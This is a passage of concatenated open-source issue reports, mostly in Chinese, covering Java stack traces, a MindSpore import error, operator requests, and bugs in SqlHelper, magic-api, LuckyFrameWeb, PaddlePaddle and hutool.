org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:198) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.interceptor.AsyncExecutionInterceptor.lambda$invoke$0(AsyncExecutionInterceptor.java:115) at java.util.concurrent.FutureTask.run$$$capture(FutureTask.java:266) at java.util.concurrent.FutureTask.run(FutureTask.java) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) Caused by: java.io.EOFException: Unexpected end of ZLIB input stream at java.util.zip.InflaterInputStream.fill(InflaterInputStream.java:240) at org.apache.commons.compress.archivers.zip.InflaterInputStreamWithStatistics.fill(InflaterInputStreamWithStatistics.java:52) at java.util.zip.InflaterInputStream.read(InflaterInputStream.java:158) at org.apache.commons.compress.archivers.zip.InflaterInputStreamWithStatistics.read(InflaterInputStreamWithStatistics.java:67) at java.util.zip.InflaterInputStream.read(InflaterInputStream.java:122) at org.apache.commons.compress.archivers.zip.InflaterInputStreamWithStatistics.read(InflaterInputStreamWithStatistics.java:58) at java.io.FilterInputStream.read(FilterInputStream.java:83) at org.apache.poi.openxml4j.util.ZipArchiveThresholdInputStream.read(ZipArchiveThresholdInputStream.java:71) at org.apache.xerces.impl.XMLEntityManager$RewindableInputStream.readAndBuffer(Unknown Source) at org.apache.xerces.impl.XMLEntityManager.setupCurrentEntity(Unknown Source) at org.apache.xerces.impl.XMLVersionDetector.determineDocVersion(Unknown Source) at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) at org.apache.xerces.parsers.XMLParser.parse(Unknown Source) at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source) at org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source) at org.apache.xmlbeans.impl.store.Locale$SaxLoader.load(Locale.java:3422) at org.apache.xmlbeans.impl.store.Locale.parseToXmlObject(Locale.java:1272) at org.apache.xmlbeans.impl.store.Locale.parseToXmlObject(Locale.java:1259) at org.apache.xmlbeans.impl.schema.SchemaTypeLoaderBase.parse(SchemaTypeLoaderBase.java:345) at org.openxmlformats.schemas.officeDocument.x2006.extendedProperties.PropertiesDocument$Factory.parse(Unknown Source) at org.apache.poi.ooxml.POIXMLProperties.&lt;init&gt;(POIXMLProperties.java:81) at org.apache.poi.ooxml.POIXMLDocument.getProperties(POIXMLDocument.java:145) ... 19 common frames omitted
[ST][MS][OPS][StandardNormal][910/gpu/cpu]ImportError: cannot import name 'issubclass_' from 'mindspore',1、StandardNormal算子脚本导入issubclass_模块失败，算子使用了启用接口 2、mindspore.issubclass_模块弃用，请排查下影响 / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :r2.0 commit_id:3da594508 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221017 MindSpore 版本：编译时间20221109121531 r2.0 commit_id:3da594508 (/): /mode pynative /mode graph test_ms_ops_standardnormal_func.py cd solution_test/cases/04operator/13random/StandardNormal pytest -s test_ms_ops_standardnormal_func.py 算子执行成功 走给梁成辉   <code>: ============================================================================================= ERRORS ============================================================================================== __________________________________________________ ERROR collecting cases/04operator/13random/StandardNormal/test_ms_ops_standardnormal_func.py ___________________________________________________ ImportError while importing test module '/home/jenkins0/solution_test/cases/04operator/13random/StandardNormal/test_ms_ops_standardnormal_func.py'. Hint: make sure your test modules/packages have valid Python names. Traceback: test_ms_ops_standardnormal_func.py:35: in &lt;module&gt; from common.ms_aw.operator.random.standardnormal_ops import StandardNormalMock ../../../../common/ms_aw/operator/random/standardnormal_ops.py:17: in &lt;module&gt; from mindspore import issubclass_ E ImportError: cannot import name 'issubclass_' from 'mindspore' (/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/__init__.py)
服务参数可以组装bean对象,"新增ObjectAssembly接口 public interface ObjectAssembly { } 通过generatorFileProcessor把组装接口的实现加入到ClassNameObjectGenerator中，在对象属性组装的过程中，增加ObjectAssembly组装对象的处理。   <code>: /** * 匹配type类型的组装 * @param type * @return */ public boolean isMatch(Class&lt;?&gt; type); /** * 根据上下文参数信息进行对象组装 * @param varName * @param object * @param context */ public void assemble(String varName,T object,Context context);"
【众智】【计算-AICPU开发】UpsampleTrilinear3dGrad,AICPU算子接入 UpsampleTrilinear3d的反向算子。 接口目录：mindspore/ops/operations/_grad_ops.py grad_output y input_size list_int 属性 output_size list_int 属性 [] scales list_float 属性 [] akign_corners bool 属性 False 对应底层算子 对应底层AI CPU算子UpsampleTrilinear3dGrad aten/src/ATen/native/UpSampleTrilinear3d.cpp 3. 异常处理 4. 算子反向 无需接入反向算子   <code>: class UpsampleTrilinear3dGrad(Primitive):
SqlHelper类中exampleOrderBy()方法中有问题,"SqlHelper类中exampleOrderBy()方法中 不对，请火速修复   <code>: sql.append(""order by ${orderByClause}\"")"");"
save方法不能把字段更新为null,"假设现在想用save方法将某个字段置为null， test_data表如下这样使用： id unmae 1 haha 词条语句报错： org.ssssssss.script.exception.MagicScriptException: 要修改的列不能为空 源码 NamedTable 类中代码：   <code>: db.table(""test_data"").primary(""id"").save({ id: 1, unmae: null ); List&lt;Map.Entry&lt;String, Object&gt;&gt; entries = new ArrayList&lt;&gt;(filterNotBlanks()); if (entries.isEmpty()) { throw new MagicAPIException(""要修改的列不能为空""); } private Collection&lt;Map.Entry&lt;String, Object&gt;&gt; filterNotBlanks() { if (this.withBlank) { return this.columns.entrySet() .stream() .filter(it -&gt; !excludeColumns.contains(it.getKey())) .collect(Collectors.toList()); } return this.columns.entrySet() .stream() .filter(it -&gt; StringUtils.isNotBlank(Objects.toString(it.getValue(), """"))) .filter(it -&gt; !excludeColumns.contains(it.getKey())) .collect(Collectors.toList()); }"
测试管理-用例管理页面打开报500,"版本 LuckyFrameWeb-V3.1_Beta 当删除所有项目的时候 系统管理-&gt;项目管理 删除所有项目 测试管理-&gt;用例管理 -&gt;500 建议 当所有被项目删除，打开用例管理页面提示用户新建项目再打开该页面 报错信息   <code>: org.thymeleaf.exceptions.TemplateInputException: An error happened during template parsing (template: ""class path resource [templates/testmanagmt/projectCase/projectCase.html]"") at org.thymeleaf.templateparser.markup.AbstractMarkupTemplateParser.parse(AbstractMarkupTemplateParser.java:241) at org.thymeleaf.templateparser.markup.AbstractMarkupTemplateParser.parseStandalone(AbstractMarkupTemplateParser.java:100) at org.thymeleaf.engine.TemplateManager.parseAndProcess(TemplateManager.java:666) at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1098) at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1072) at org.thymeleaf.spring5.view.ThymeleafView.renderFragment(ThymeleafView.java:362) at org.thymeleaf.spring5.view.ThymeleafView.render(ThymeleafView.java:189) at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1370) at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1116) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1055) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:897) at javax.servlet.http.HttpServlet.service(HttpServlet.java:634) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) at javax.servlet.http.HttpServlet.service(HttpServlet.java:741) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:112) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:112) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:490) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:791) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1417) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: org.attoparser.ParseException: Exception evaluating SpringEL expression: ""projectCaseModule.moduleId"" (template: ""testmanagmt/projectCase/projectCase"" - line 12, col 55) at org.attoparser.MarkupParser.parseDocument(MarkupParser.java:393) at org.attoparser.MarkupParser.parse(MarkupParser.java:257) at org.thymeleaf.templateparser.markup.AbstractMarkupTemplateParser.parse(AbstractMarkupTemplateParser.java:230) ... 88 common frames omitted Caused by: org.thymeleaf.exceptions.TemplateProcessingException: Exception evaluating SpringEL expression: ""projectCaseModule.moduleId"" (template: ""testmanagmt/projectCase/projectCase"" - line 12, col 55) at org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator.evaluate(SPELVariableExpressionEvaluator.java:290) at org.thymeleaf.standard.expression.VariableExpression.executeVariableExpression(VariableExpression.java:166) at org.thymeleaf.standard.expression.SimpleExpression.executeSimple(SimpleExpression.java:66) at org.thymeleaf.standard.expression.Expression.execute(Expression.java:109) at org.thymeleaf.standard.expression.Expression.execute(Expression.java:138) at org.thymeleaf.standard.processor.AbstractStandardExpressionAttributeTagProcessor.doProcess(AbstractStandardExpressionAttributeTagProcessor.java:144) at org.thymeleaf.processor.element.AbstractAttributeTagProcessor.doProcess(AbstractAttributeTagProcessor.java:74) at org.thymeleaf.processor.element.AbstractElementTagProcessor.process(AbstractElementTagProcessor.java:95) at org.thymeleaf.util.ProcessorConfigurationUtils$ElementTagProcessorWrapper.process(ProcessorConfigurationUtils.java:633) at org.thymeleaf.engine.ProcessorTemplateHandler.handleStandaloneElement(ProcessorTemplateHandler.java:918) at org.thymeleaf.engine.TemplateHandlerAdapterMarkupHandler.handleStandaloneElementEnd(TemplateHandlerAdapterMarkupHandler.java:260) at org.thymeleaf.templateparser.markup.InlinedOutputExpressionMarkupHandler$InlineMarkupAdapterPreProcessorHandler.handleStandaloneElementEnd(InlinedOutputExpressionMarkupHandler.java:256) at org.thymeleaf.standard.inline.OutputExpressionInlinePreProcessorHandler.handleStandaloneElementEnd(OutputExpressionInlinePreProcessorHandler.java:169) at org.thymeleaf.templateparser.markup.InlinedOutputExpressionMarkupHandler.handleStandaloneElementEnd(InlinedOutputExpressionMarkupHandler.java:104) at org.attoparser.HtmlElement.handleStandaloneElementEnd(HtmlElement.java:79) at org.attoparser.HtmlMarkupHandler.handleStandaloneElementEnd(HtmlMarkupHandler.java:241) at org.attoparser.MarkupEventProcessorHandler.handleStandaloneElementEnd(MarkupEventProcessorHandler.java:327) at org.attoparser.ParsingElementMarkupUtil.parseStandaloneElement(ParsingElementMarkupUtil.java:96) at org.attoparser.MarkupParser.parseBuffer(MarkupParser.java:706) at org.attoparser.MarkupParser.parseDocument(MarkupParser.java:301) ... 90 common frames omitted Caused by: org.springframework.expression.spel.SpelEvaluationException: EL1007E: Property or field 'moduleId' cannot be found on null at org.springframework.expression.spel.ast.PropertyOrFieldReference.readProperty(PropertyOrFieldReference.java:213) at org.springframework.expression.spel.ast.PropertyOrFieldReference.getValueInternal(PropertyOrFieldReference.java:104) at org.springframework.expression.spel.ast.PropertyOrFieldReference.access$000(PropertyOrFieldReference.java:51) at org.springframework.expression.spel.ast.PropertyOrFieldReference$AccessorLValue.getValue(PropertyOrFieldReference.java:406) at org.springframework.expression.spel.ast.CompoundExpression.getValueInternal(CompoundExpression.java:90) at org.springframework.expression.spel.ast.SpelNodeImpl.getValue(SpelNodeImpl.java:111) at org.springframework.expression.spel.standard.SpelExpression.getValue(SpelExpression.java:328) at org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator.evaluate(SPELVariableExpressionEvaluator.java:263) ... 109 common frames omitted 15:54:29.537 [http-nio-80-exec-17] ERROR o.a.c.c.C.[.[.[.[dispatcherServlet] - [log,175] - Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.thymeleaf.exceptions.TemplateInputException: An error happened during template parsing (template: ""class path resource [templates/testmanagmt/projectCase/projectCase.html]"")] with root cause org.springframework.expression.spel.SpelEvaluationException: EL1007E: Property or field 'moduleId' cannot be found on null at org.springframework.expression.spel.ast.PropertyOrFieldReference.readProperty(PropertyOrFieldReference.java:213) at org.springframework.expression.spel.ast.PropertyOrFieldReference.getValueInternal(PropertyOrFieldReference.java:104) at org.springframework.expression.spel.ast.PropertyOrFieldReference.access$000(PropertyOrFieldReference.java:51) at org.springframework.expression.spel.ast.PropertyOrFieldReference$AccessorLValue.getValue(PropertyOrFieldReference.java:406) at org.springframework.expression.spel.ast.CompoundExpression.getValueInternal(CompoundExpression.java:90) at org.springframework.expression.spel.ast.SpelNodeImpl.getValue(SpelNodeImpl.java:111) at org.springframework.expression.spel.standard.SpelExpression.getValue(SpelExpression.java:328) at org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator.evaluate(SPELVariableExpressionEvaluator.java:263) at org.thymeleaf.standard.expression.VariableExpression.executeVariableExpression(VariableExpression.java:166) at org.thymeleaf.standard.expression.SimpleExpression.executeSimple(SimpleExpression.java:66) at org.thymeleaf.standard.expression.Expression.execute(Expression.java:109) at org.thymeleaf.standard.expression.Expression.execute(Expression.java:138) at org.thymeleaf.standard.processor.AbstractStandardExpressionAttributeTagProcessor.doProcess(AbstractStandardExpressionAttributeTagProcessor.java:144) at org.thymeleaf.processor.element.AbstractAttributeTagProcessor.doProcess(AbstractAttributeTagProcessor.java:74) at org.thymeleaf.processor.element.AbstractElementTagProcessor.process(AbstractElementTagProcessor.java:95) at org.thymeleaf.util.ProcessorConfigurationUtils$ElementTagProcessorWrapper.process(ProcessorConfigurationUtils.java:633) at org.thymeleaf.engine.ProcessorTemplateHandler.handleStandaloneElement(ProcessorTemplateHandler.java:918) at org.thymeleaf.engine.TemplateHandlerAdapterMarkupHandler.handleStandaloneElementEnd(TemplateHandlerAdapterMarkupHandler.java:260) at org.thymeleaf.templateparser.markup.InlinedOutputExpressionMarkupHandler$InlineMarkupAdapterPreProcessorHandler.handleStandaloneElementEnd(InlinedOutputExpressionMarkupHandler.java:256) at org.thymeleaf.standard.inline.OutputExpressionInlinePreProcessorHandler.handleStandaloneElementEnd(OutputExpressionInlinePreProcessorHandler.java:169) at org.thymeleaf.templateparser.markup.InlinedOutputExpressionMarkupHandler.handleStandaloneElementEnd(InlinedOutputExpressionMarkupHandler.java:104) at org.attoparser.HtmlElement.handleStandaloneElementEnd(HtmlElement.java:79) at org.attoparser.HtmlMarkupHandler.handleStandaloneElementEnd(HtmlMarkupHandler.java:241) at org.attoparser.MarkupEventProcessorHandler.handleStandaloneElementEnd(MarkupEventProcessorHandler.java:327) at org.attoparser.ParsingElementMarkupUtil.parseStandaloneElement(ParsingElementMarkupUtil.java:96) at org.attoparser.MarkupParser.parseBuffer(MarkupParser.java:706) at org.attoparser.MarkupParser.parseDocument(MarkupParser.java:301) at org.attoparser.MarkupParser.parse(MarkupParser.java:257) at org.thymeleaf.templateparser.markup.AbstractMarkupTemplateParser.parse(AbstractMarkupTemplateParser.java:230) at org.thymeleaf.templateparser.markup.AbstractMarkupTemplateParser.parseStandalone(AbstractMarkupTemplateParser.java:100) at org.thymeleaf.engine.TemplateManager.parseAndProcess(TemplateManager.java:666) at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1098) at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1072) at org.thymeleaf.spring5.view.ThymeleafView.renderFragment(ThymeleafView.java:362) at org.thymeleaf.spring5.view.ThymeleafView.render(ThymeleafView.java:189) at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1370) at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1116) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1055) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:897) at javax.servlet.http.HttpServlet.service(HttpServlet.java:634) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) at javax.servlet.http.HttpServlet.service(HttpServlet.java:741) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:112) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:112) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:490) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:791) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1417) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748)"
DetectionMAP的使用疑问,"请问此代码中gt_box=[xmin, ymin, xmax, ymax]是指原始图片中框的大小，还是指变换为（0，1）之间的框值？   <code>: class paddle.fluid.metrics.DetectionMAP(input, gt_label, gt_box, gt_difficult=None, class_num=None, background_label=0, overlap_threshold=0.5, evaluate_difficult=True, ap_version='integral')"
BeanUtil.toBean source是空的问题,"JDK版本： openjdk_8_241 hutool版本： 5.6.0 这里的source是null，在转换的时候应该stu也是null，但是stu不是null，不过stu的各个属性都是null   <code>: Student stu = BeanUtil.toBean(null,Student.class);"
